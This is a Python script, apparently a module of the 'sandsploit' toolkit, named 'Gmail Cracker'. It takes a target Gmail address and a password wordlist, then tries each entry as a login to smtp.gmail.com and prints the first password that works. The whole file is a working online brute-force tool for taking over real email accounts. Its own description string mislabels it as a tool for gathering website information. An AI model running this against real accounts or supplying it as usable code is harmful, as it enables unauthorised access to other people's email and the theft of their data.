#!/usr/bin/python3
import smtplib , requests , re ,readline,sys


sys.path.append("/data/data/com.termux/files/usr/opt/sandsploit/core")
sys.path.append("/opt/sandsploit/core/")
import complator
USER = None
WORDLIST = None
name = "Gmail Cracker"
author = "@Aμιρ-0x0 (AMJ)"
info = "a Tool for Grab Informations of websites...."
def help():
    print ("author              to show author name")
    print ("help                to show this massage")
    print ("info                to show description of the tool ")
    print ("set                 to set options such as : [set host http://google.com/]")
    print ("show_options        to show options of Tools")
    print ("exit                to quit from Tool")
    print ("run                 to Run Session")
def options():
    print ("options               value")
    print ("==========            ============")
    print ("user                  ",USER)
    print ("wordlist              ",WORDLIST)
def run():
    try:
            
        smtpserver = smtplib.SMTP("smtp.gmail.com",587)
        smtpserver.ehlo()
        smtpserver.starttls()

        passlist = open(WORDLIST,'r')
        for i in passlist:
            try:
                smtpserver.login(USER,i)
                print ('[!] password find : ',i)
                break
            except:
                print ('[*] Password Incorrect :',i)
    except:
        print ("Please Chack Internet and Options...")
while True:
    try:
        option = input ("\033[96m┌─[SSF][\033[91m"+name+"\033[96m]\n└─▪ ")
        op2 = option.split(" ")
        if option == "help":
            help()
        elif option == "author":
            print (author)
        elif option == "info":
            print (info)

        elif option == "show_options":
            options()
        elif op2[0] == "set":
            op3 = op2[1].upper()    
            vars()[op3] = op2[2]
            print ("%s => %s"%(op2[1],op2[2]))
        elif option == "run":
            run()
        elif option == "exit":
            break
        else:
            print ("Wrong Command ! ")
    except:
        print ('Unkonwn Error !')